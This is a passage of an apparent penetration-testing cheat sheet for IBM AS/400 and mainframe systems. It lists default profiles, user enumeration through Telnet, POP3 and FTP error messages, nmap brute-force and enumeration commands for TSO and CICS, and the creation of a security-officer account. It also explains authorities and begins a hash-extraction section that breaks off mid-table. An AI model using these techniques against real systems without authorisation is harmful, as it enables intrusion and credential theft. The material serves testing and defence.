<li><a href="https://github.com/hackthelegacy/hack400tool/tree/master/dist">hackthelegacy/hack400tool</a> - Security handling tools for IBM Power Systems<ul>
<li><a href="https://github.com/hackthelegacy/hack400tool/blob/master/dist/hack400auditor/hack400auditor.jar">hack400auditor/hack400auditor.jar</a></li>
<li><a href="https://github.com/hackthelegacy/hack400tool/blob/master/dist/hack400exploiter/hack400exploiter.jar">hack400exploiter/hack400exploiter.jar</a></li>
<li><a href="https://github.com/hackthelegacy/hack400tool/blob/master/dist/hack400scanner/hack400scanner.jar">hack400scanner/hack400scanner.jar</a></li>
</ul>
</li>
<li><a href="https://github.com/ayoul3/cicspwn">ayoul3/cicspwn</a> - CICSpwn is a tool to pentest a CICS Transaction servers on z/OS.</li>
<li><a href="https://github.com/ayoul3/cicsshot">ayoul3/cicsshot</a> - Tool to screenshot CICS transactions</li>
<li><a href="https://github.com/sensepost/birp">sensepost/birp</a> - Big Iron Recon &amp; Pwnage</li>
</ul>
<p><img alt="AS400 Mind Map" src="https://web.archive.org/web/20140830222720if_/http://www.toolswatch.org/wp-content/uploads/2013/02/AS400.jpg" /></p>
<h2 id="default-credentials">Default Credentials</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Print users with default passwords (Username == Password case insensitive)</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c"># Must have *ALLOBJ and *SECADM special authorities to use this command.</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">ANZDFTPWD</span>
</code></pre></div>
<p>Other default profiles:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">QAUTPROF</span> <span class="n">QBRMS</span> <span class="n">QCLUMGT</span> <span class="n">QCLUSTER</span> <span class="n">QCOLSRV</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">QDBSHR</span> <span class="n">QDBSHRDO</span> <span class="n">QDFTOWN</span> <span class="n">QDIRSRV</span> <span class="n">QDLFM</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">QDOC</span> <span class="n">QDSNX</span> <span class="n">QEJB</span> <span class="n">QFNC</span> <span class="n">QGATE</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">QLPAUTO</span> <span class="n">QLPINSTALL</span> <span class="n">QMQM</span> <span class="n">QMQMADM</span> <span class="n">QMSF</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">QNETSPLF</span> <span class="n">QNFSANON</span> <span class="n">QNOTES</span> <span class="n">QNTP</span> <span class="n">QPEX</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="n">QPGMR</span> <span class="n">QPM400</span> <span class="n">QPRJOWN</span> <span class="n">QRJE</span> <span class="n">QRMTCAL</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">QSECOFR</span> <span class="n">QSNADS</span> <span class="n">QSPL</span> <span class="n">QSPLJOB</span> <span class="n">QSRV</span>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">QSRVBAS</span> <span class="n">QSVCDRCTR</span> <span class="n">QSYS</span> <span class="n">QSYSOPR</span> <span class="n">QTCP</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="n">QTFTP</span> <span class="n">QTMHHTP1</span> <span class="n">QTMHHTTP</span> <span class="n">QTMPLPD</span> <span class="n">QTMTWSG</span>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="n">QTSTRQS</span> <span class="n">QUMB</span> <span class="n">QUSER</span> <span class="n">QYPSJSVR</span> <span class="n">QYPUOWN30</span>
</code></pre></div>
<h2 id="user-enumeration">User Enumeration</h2>
<h3 id="telnet">Telnet</h3>
<p>Authentication Error Messages in <strong>Telnet</strong></p>
<ul>
<li>CPF1107 : Password not correct for user profile</li>
<li>CPF1109 : Not authorized to subsystem.</li>
<li>CPF1110 : Not authorized to work station.</li>
<li>CPF1116 : Next not valid sign-on attempt varies off device.</li>
<li>CPF1118 : No password associated with user XYZ.</li>
<li>CPF1120 – User AABBA does not exist</li>
<li>CPF1133 Value X Z S is not a valid name</li>
<li>CPF1392 : Next not valid sign-on disables user profile.</li>
<li>CPF1394 : User profile XYZ cannot sign on.</li>
</ul>
<h3 id="pop3">POP3</h3>
<p>Authentication Error Messages in <strong>POP3</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">+</span><span class="n">OK</span> <span class="n">POP3</span> <span class="n">server</span> <span class="n">ready</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">USER</span> <span class="n">bogus</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">+</span><span class="n">OK</span> <span class="n">POP3</span> <span class="n">server</span> <span class="n">ready</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">PASS</span> <span class="n">xyz</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">-ERR</span> <span class="n">Logon</span> <span class="n">attempt</span> <span class="n">invalid</span> <span class="n">CPF2204</span>
</code></pre></div>
<ul>
<li>CPF2204 : User profile not found</li>
<li>CPF22E2 : Password not correct for user profile</li>
<li>CPF22E3 : User profile is disabled</li>
<li>CPF22E4 : Password for user profile has expired</li>
<li>CPF22E5 : No password associated with user profile</li>
</ul>
<h3 id="ftp">FTP</h3>
<p>Create a symbolic link to the QSYS library and list *.USRPRF</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">open</span> <span class="n">as400</span><span class="p">.</span><span class="n">victim</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">as400user</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">password</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="n">quote</span> <span class="n">site</span> <span class="n">namefmt</span> <span class="n">1</span>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">quote</span> <span class="n">site</span> <span class="n">listfmt</span> <span class="n">1</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="n">mkdir</span> <span class="p">/</span><span class="n">test12345</span>
<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="n">quote</span> <span class="n">rcmd</span> <span class="n">ADDLNK</span> <span class="n">OBJ</span><span class="p">(</span><span class="s1">&#39;/qsys.lib&#39;</span><span class="p">)</span>
<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">NEWLNK</span><span class="p">(</span><span class="s1">&#39;/test12345/qsys&#39;</span><span class="p">)</span>
<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="nb">dir </span><span class="p">/</span><span class="n">test12345</span><span class="p">/</span><span class="n">qsys</span><span class="p">/*.</span><span class="n">usrprf</span>
</code></pre></div>
<h2 id="useful-commands">Useful Commands</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DSPUSRPRF &lt;user&gt;</code></td>
<td>Display user profile</td>
</tr>
<tr>
<td><code>WRKUSRPRF &lt;user&gt;</code></td>
<td>Display user, look for Group profile , and Supplemental groups</td>
</tr>
<tr>
<td><code>WRKUSRPRF *ALL</code></td>
<td>Display all users</td>
</tr>
<tr>
<td><code>DSPPGM LIB/PROGRAM</code></td>
<td>Display program infos</td>
</tr>
<tr>
<td><code>WRKOBJ (*ALL QSYS *LIB)</code></td>
<td>List libraries</td>
</tr>
<tr>
<td><code>CHGUSRPRF USRPRF(&lt;USERNAME&gt;) PASSWORD(&lt;NEW_PASSWORD&gt;)</code></td>
<td>Setup User Password</td>
</tr>
<tr>
<td><code>QSH</code></td>
<td>Start a QSHELL instance</td>
</tr>
</tbody>
</table>
<p>Check strings in PGM/SRVPGM</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">cat </span><span class="n">QLWIUTIL4</span><span class="p">.</span><span class="n">SRVPGM</span> <span class="p">|</span> <span class="n">iconv</span> <span class="o">-f</span> <span class="n">cp1141</span> <span class="n">-t</span> <span class="n">UTF</span><span class="p">-</span><span class="n">8</span> <span class="p">|</span> <span class="n">strings</span>
</code></pre></div>
<h2 id="nmap-scripts">NMAP Scripts</h2>
<ul>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/tn3270-screen.html">nse/tn3270-screen</a> - Connects to a tn3270 'server' and returns the screen.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span> <span class="n">tn3270-info</span><span class="p">,</span><span class="n">tn3270_screen</span> <span class="p">&lt;</span><span class="n">host</span><span class="p">&gt;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/tso-enum.html">nse/tso-enum</a> - TSO User ID enumerator for IBM mainframes (z/OS).</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">tso-enum</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">nmap</span> <span class="n">-sV</span> <span class="n">-p</span> <span class="n">9923</span> <span class="n">10</span><span class="p">.</span><span class="n">32</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">10</span> <span class="p">-</span><span class="n">-script</span> <span class="n">tso-enum</span> <span class="p">-</span><span class="n">-script-args</span> <span class="n">userdb</span><span class="p">=</span><span class="n">tso_users</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="n">tso-enum</span><span class="p">.</span><span class="n">commands</span><span class="p">=</span><span class="s2">&quot;logon applid(tso)&quot;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/tso-brute.html">nse/tso-brute</a> - TSO account brute forcer.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">nmap</span> <span class="n">-p</span> <span class="n">2401</span> <span class="p">-</span><span class="n">-script</span> <span class="n">tso-brute</span> <span class="p">&lt;</span><span class="n">host</span><span class="p">&gt;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/cics-user-enum.html">nse/cics-user-enum</a> - CICS User ID enumeration script for the CESL/CESN Login screen.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">cics-user-enum</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">cics-user-enum</span> <span class="p">-</span><span class="n">-script-args</span> <span class="n">userdb</span><span class="p">=</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="n">cics-user-enum</span><span class="p">.</span><span class="n">commands</span><span class="p">=</span><span class="s2">&quot;exit;logon applid(cics42)&quot;</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/cics-user-brute.html">nse/cics-user-brute</a> - CICS User ID brute forcing script for the CESL login screen.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">cics-user-brute</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">cics-user-brute</span> <span class="p">-</span><span class="n">-script-args</span> <span class="n">userdb</span><span class="p">=</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="n">cics-user-brute</span><span class="p">.</span><span class="n">commands</span><span class="p">=</span><span class="s2">&quot;exit;logon applid(cics42)&quot;</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/cics-info.html">nse/cics-info</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">cics-info</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">cics-info</span> <span class="p">-</span><span class="n">-script-args</span> <span class="n">cics-info</span><span class="p">.</span><span class="n">commands</span><span class="p">=</span><span class="s1">&#39;logon applid(coolcics)&#39;</span><span class="p">,</span><span class="n">cics-info</span><span class="p">.</span><span class="n">user</span><span class="p">=</span><span class="n">test</span><span class="p">,</span><span class="n">cics-info</span><span class="p">.</span><span class="n">pass</span><span class="p">=</span><span class="n">test</span><span class="p">,</span><span class="n">cics-info</span><span class="p">.</span><span class="n">cemt</span><span class="p">=</span><span class="s1">&#39;ZEMT&#39;</span><span class="p">,</span><span class="n">cics-info</span><span class="p">.</span><span class="n">trans</span><span class="p">=</span><span class="n">CICA</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/cics-enum.html">nse/cics-enum</a> - CICS transaction ID enumerator for IBM mainframes.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">cics-enum</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="n">cics-enum</span> <span class="p">-</span><span class="n">-script-args</span><span class="p">=</span><span class="n">idlist</span><span class="p">=</span><span class="n">default_cics</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="n">cics-enum</span><span class="p">.</span><span class="n">command</span><span class="p">=</span><span class="s2">&quot;exit;logon applid(cics42)&quot;</span><span class="p">,</span><span class="n">cics-enum</span><span class="p">.</span><span class="n">path</span><span class="p">=</span><span class="s2">&quot;/home/dade/screenshots/&quot;</span><span class="p">,</span><span class="n">cics-enum</span><span class="p">.</span><span class="n">noSSL</span><span class="p">=</span><span class="n">true</span> <span class="n">-p</span> <span class="n">23</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/lu-enum.html">nse/lu-enum</a> - Attempts to enumerate Logical Units (LU) of TN3270E servers.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span> <span class="n">lu-enum</span> <span class="p">-</span><span class="n">-script-args</span> <span class="n">lulist</span><span class="p">=</span><span class="n">lus</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="n">lu-enum</span><span class="p">.</span><span class="n">path</span><span class="p">=</span><span class="s2">&quot;/home/dade/screenshots/&quot;</span> <span class="n">-p</span> <span class="n">23</span> <span class="n">-sV</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://nmap.org/nsedoc/scripts/vtam-enum.html">nse/vtam-enum</a> -  Brute force those VTAM application IDs</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span> <span class="n">vtam-enum</span> <span class="p">-</span><span class="n">-script-args</span> <span class="n">idlist</span><span class="p">=</span><span class="n">defaults</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="n">vtam-enum</span><span class="p">.</span><span class="n">command</span><span class="p">=</span><span class="s2">&quot;exit;logon applid(logos)&quot;</span><span class="p">,</span><span class="n">vtam-enum</span><span class="p">.</span><span class="n">macros</span><span class="p">=</span><span class="n">true</span><span class="p">,</span><span class="n">vtam-enum</span><span class="p">.</span><span class="n">path</span><span class="p">=</span><span class="s2">&quot;/home/dade/screenshots/&quot;</span> <span class="n">-p</span> <span class="n">23</span> <span class="n">-sV</span> <span class="p">&lt;</span><span class="n">targets</span><span class="p">&gt;</span>
</code></pre></div>
</li>
</ul>
<h2 id="user-class">User Class</h2>
<p>A User Class (USRCLS) defines a predefined set of authorities and system privileges for a user profile. It determines the user's general role and access level within the system. However, a user class alone does not directly grant special authorities (SPCAUT); instead, it serves as a guideline for assigning them.</p>
<p>In this example, we create a high-privilege user by assigning them the <code>*SECOFR</code> (Security Officer) user class (USRCLS). By setting the special authority attribute (SPCAUT) to <code>*USRCLS</code>, the system automatically grants the user all special authorities associated with the <code>*SECOFR</code> class.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">CRTUSRPRF</span> <span class="n">USRPRF</span><span class="p">(</span><span class="n">MYUSER</span><span class="p">)</span> <span class="n">USRCLS</span><span class="p">(*</span><span class="n">SECOFR</span><span class="p">)</span> <span class="n">SPCAUT</span><span class="p">(*</span><span class="n">USRCLS</span><span class="p">)</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>User Class</th>
<th>Special Authority from User Classes</th>
</tr>
</thead>
<tbody>
<tr>
<td>*SECOFR (Security Officer)</td>
<td>Full system control, including user management and security. All special authorities</td>
</tr>
<tr>
<td>*SECADM (Security Administrator)</td>
<td>Can manage users but not system-wide settings. <code>*SECADM</code> special authority</td>
</tr>
<tr>
<td>*SYSOPR (System Operator)</td>
<td>Can manage system operations but not security settings. <code>*SAVSYS</code> and <code>*JOBCTL</code> special authority</td>
</tr>
<tr>
<td>*ALLOBJ (All Object Authority)</td>
<td>Can access all objects but may lack security control.</td>
</tr>
<tr>
<td>*PGMR</td>
<td>Can create and modify programs but has limited access to system administration functions. No special authorities</td>
</tr>
<tr>
<td>*USER</td>
<td>Standard user with minimal privileges, typically for general system use. No special authorities</td>
</tr>
</tbody>
</table>
<h2 id="authority">Authority</h2>
<p>In AS400 (IBM i), authority controls user access to system objects (libraries, files, programs, etc.). It ensures security by defining what users can do with specific objects.</p>
<ul>
<li><code>*ALL</code>: Full access (read, write, delete, execute).</li>
<li><code>*CHANGE</code>: Modify but not delete.</li>
<li><code>*EXCLUDE</code>: No access.</li>
<li><code>*USE</code>: Read-only or execute.</li>
<li><code>*USERDEF</code>: Custom authority settings based on a user's specific needs.</li>
</ul>
<p>Secure authority standard for users:</p>
<ul>
<li><code>USRCLS</code> should be <code>*USER</code></li>
<li><code>SPCAUT</code> should be <code>*NONE</code></li>
<li><code>AUT</code> should always be <code>*EXCLUDE</code></li>
<li><code>*USRPRF</code> should have authority to itself</li>
<li><code>*PUBLIC</code> should be <code>*EXCLUDE</code></li>
<li>No other authorities should exist.</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">Object</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">:</span>       <span class="n">XXXXXX</span>           <span class="n">Owner</span>  <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">:</span>   <span class="n">QSECOFR</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">Library</span>  <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">:</span>         <span class="n">QSYS</span>               <span class="n">Primary</span> <span class="nb">group </span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">:</span>   <span class="p">*</span><span class="n">NONE</span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">Object</span> <span class="nb">type </span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">:</span>       <span class="p">*</span><span class="n">USRPRF</span>         <span class="n">ASP</span> <span class="n">device</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">:</span>   <span class="p">*</span><span class="n">SYSBAS</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>                     <span class="n">Object</span>
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="n">User</span> <span class="nb">Group </span>          <span class="n">Authority</span>
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="p">*</span><span class="n">PUBLIC</span>              <span class="p">*</span><span class="n">EXCLUDE</span>
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="n">QSECOFR</span>              <span class="p">*</span><span class="n">ALL</span>
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="n">XXXXXX</span>               <span class="n">USER</span> <span class="n">DEF</span>
</code></pre></div>
<p>Special authorities defaults (security level 30 or above)</p>
<table>
<thead>
<tr>
<th>User Class</th>
<th>Special Authority</th>
</tr>
</thead>
<tbody>
<tr>
<td>*SECOFR</td>
<td>*ALL</td>
</tr>
<tr>
<td>*SECADM</td>
<td>*SECADM</td>
</tr>
<tr>
<td>*PGMR</td>
<td>*NONE</td>
</tr>
<tr>
<td>*SYSOPR</td>
<td><em>JOBCTL,</em>SAVSYS</td>
</tr>
<tr>
<td>*USER</td>
<td>*NONE</td>
</tr>
</tbody>
</table>
<h2 id="special-authority">Special Authority</h2>
<p>Special authority is used to specify the types of actions a user can perform on system resources. A user can be given one or more special authorities.</p>
<ul>
<li><code>*ALLOBJ</code> special authority: All-object (<code>*ALLOBJ</code>) special authority allows the user to access any resource on the system whether private authority exists for the user.</li>
<li><code>*SECADM</code> special authority: Security administrator (<code>*SECADM</code>) special authority allows a user to create, change, and delete user profiles.</li>
<li><code>*JOBCTL</code> special authority: The Job control (<code>*JOBCTL</code>) special authority allows a user to change the priority of jobs and of printing, end a job before it has finished, or delete output before it has printed. <code>*JOBCTL</code> special authority can also give a user access to confidential spooled output, if output queues are specified <code>OPRCTL(*YES)</code>.</li>
<li><code>*SPLCTL</code> special authority: Spool control (<code>*SPLCTL</code>) special authority allows the user to perform all spool control functions, such as changing, deleting, displaying, holding and releasing spooled files.</li>
<li><code>*SAVSYS</code> special authority: Save system (<code>*SAVSYS</code>) special authority gives the user the authority to save, restore, and free storage for all objects on the system, regardless of whether the user has object existence authority to the objects.</li>
<li><code>*SERVICE</code> special authority: Service (<code>*SERVICE</code>) special authority allows the user to start system service tools using the STRSST command. This special authority allows the user to debug a program with only <code>*USE</code> authority to the program and perform the display and alter service functions. It also allows the user to perform trace functions.</li>
<li><code>*AUDIT</code> special authority: Audit (<code>*AUDIT</code>) special authority gives the user the ability to view and change auditing characteristics.</li>
<li><code>*IOSYSCFG</code> special authority: System configuration (<code>*IOSYSCFG</code>) special authority gives the user the ability to change how the system is configured. Users with this special authority can add or remove communications configuration information, work with TCP/IP servers, and configure the internet connection server (ICS). Most commands for configuring communications require <code>*IOSYSCFG</code> special authority.</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c"># Print users with special authorities</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">PRTUSRPRF</span> <span class="n">TYPE</span><span class="p">(*</span><span class="n">ALL</span><span class="p">)</span> <span class="n">SELECT</span><span class="p">(*</span><span class="n">SPCAUT</span><span class="p">)</span> <span class="n">SPCAUT</span><span class="p">(*</span><span class="n">ALL</span><span class="p">)</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c"># Print rights on a library object</span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="n">DSPOBJAUT</span> <span class="n">OBJ</span><span class="p">(</span><span class="n">MYLIB</span><span class="p">)</span> <span class="n">OBJTYPE</span><span class="p">(*</span><span class="n">LIB</span><span class="p">)</span>
</code></pre></div>
<p><strong>QSECOFR</strong> (short for Security Officer) is the highest-level user profile, similar to the "root" user in Unix/Linux or the "Administrator" account in Windows. It has full control over the system, including security settings, user management, and system configuration.</p>
<p>The <code>*ALLOBJ</code> (All Object Authority) special authority allows a user to access all objects on the system, regardless of their specific object-level permissions. A user with this authority can perform almost any action on the system, making it a powerful and sensitive privilege.</p>
<p><strong>QSECOFR</strong> has <code>*ALLOBJ</code> by default, along with other special authorities, making it the most powerful user profile on IBM i.</p>
<h2 id="adopted-authority">Adopted Authority</h2>
<p>Equivalent of setuid in Linux.</p>
<p>Adopted Authority allows a user to acquire authority to objects beyond what is granted by <code>*PUBLIC</code> and private authorities. As an example, suppose a user should normally be restricted from payroll files, but to perform his job, the user must be able to run a payroll report. Adopted authority allows the user to acquire enough authority to read the file for the purpose of the payroll report without granting the user any authority to the file outside of the program that runs the report.</p>
<p>Before granting adopted authority to PAYLIST, you must determine what authorities it already has. On an operating system command line, type the following:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">DSPPGM</span> <span class="n">PAYLIB</span><span class="p">/</span><span class="n">PAYLIST</span>
</code></pre></div>
<p>Example of an adopted authority running as QAUTPROF</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">Owner</span><span class="p">:</span> <span class="n">QAUTPROF</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">User</span> <span class="n">profile</span><span class="p">:</span> <span class="p">*</span><span class="n">OWNER</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">Use</span> <span class="n">adopted</span> <span class="n">authority</span><span class="p">:</span> <span class="p">*</span><span class="n">YES</span>
</code></pre></div>
<p>If User profile is <code>*OWNER</code>, the program runs combining the authorities of the Owner of the program with those of the User Profile running the program.</p>
<h2 id="password-cracking">Password Cracking</h2>
<p><strong>Requirements</strong>:</p>
<ul>
<li><code>*ALLOBJ</code> privileges: Full control over all objects</li>
<li><code>*SECADM</code> privileges: Profile management, low-level system access</li>
</ul>
<p>Extract hashes with <strong>QSYRUPWD</strong>:</p>
<table>
<thead>
<tr>
<th>Description</th>
<th>Format</th>
<th>Type</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>Receiver variable</td>
<td>Output</td>
<td>Char(*)</td>
<td>2000B</td>
</tr>
<tr>
<td>Length of receiver variable</td>
<td>Input</td>
<td>Binary(4)</td>
<td></td>
</tr>
<tr>
<td>Format</td>
<td>Input</td>
<td>Char(8)</td>
<td>"UPWD0100"</td>
</tr>
<tr>
<td>User profile name</td>
<td>Input</td>
<td>Char(10)</td>
<td>userName</td>
</tr>
<tr>
<td>Error code</td>
<td>I/O</td>
<td>Char(*)</td>
<td></td>
</tr>
</tbody>
</table>
<p>The output format <strong>UPWD0100</strong> is documented below:</p>
<table>
<thead>
<tr>
<th>Offset Dec</th>
<th>Offset Hex</th>
<th>Type</th>
<th>Field</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>BINARY(4)</td>
<td>Bytes returned</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>BINARY(4)</td>
<td>Bytes available</td>
</tr>
<tr>
<td>8</td>
